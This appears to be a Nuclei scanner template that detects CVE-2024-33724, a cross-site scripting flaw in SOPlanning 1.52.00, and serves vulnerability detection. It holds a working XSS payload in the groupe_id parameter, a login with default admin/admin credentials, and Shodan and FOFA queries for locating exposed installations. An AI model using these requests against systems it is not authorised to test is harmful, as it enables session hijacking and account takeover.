http:
- attack: pitchfork
  host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains_all(body_2, "<script>alert(document.domain)</script>", "SOPlanning")
    type: dsl
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST /process/login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    login={{username}}&password={{password}}

    '
  - 'GET /process/groupe_save.php?saved=1&groupe_id=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C!--&nom=Project+New
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
id: CVE-2024-33724
info:
  author: s4e-io
  description: 'SOPlanning v1.52.00 is vulnerable to XSS via the ''groupe_id'' parameters
    a remote unautheticated attacker can hijack the admin account or other users.
    The remote attacker can hijack a users session or credentials and perform a takeover
    of the entire platform.

    '
  impact: 'Authenticated attackers can inject malicious scripts via the groupe_id
    parameter, potentially hijacking admin or user sessions.

    '
  metadata:
    fofa-query: body="soplanning"
    max-request: 2
    product: soplanning
    shodan-query:
    - html:"soplanning"
    - http.html:"soplanning"
    vendor: soplanning
    verified: true
  name: SOPlanning 1.52.00 Cross Site Scripting
  reference:
  - https://packetstormsecurity.com/files/178434/SOPlanning-1.52.00-Cross-Site-Scripting.html
  - https://github.com/fuzzlove/soplanning-1.52-exploits
  remediation: 'Update SOPlanning to a version that patches the XSS vulnerability.

    '
  severity: medium
  tags: packetstorm,cve,cve2024,authenticated,soplanning,xss,vuln
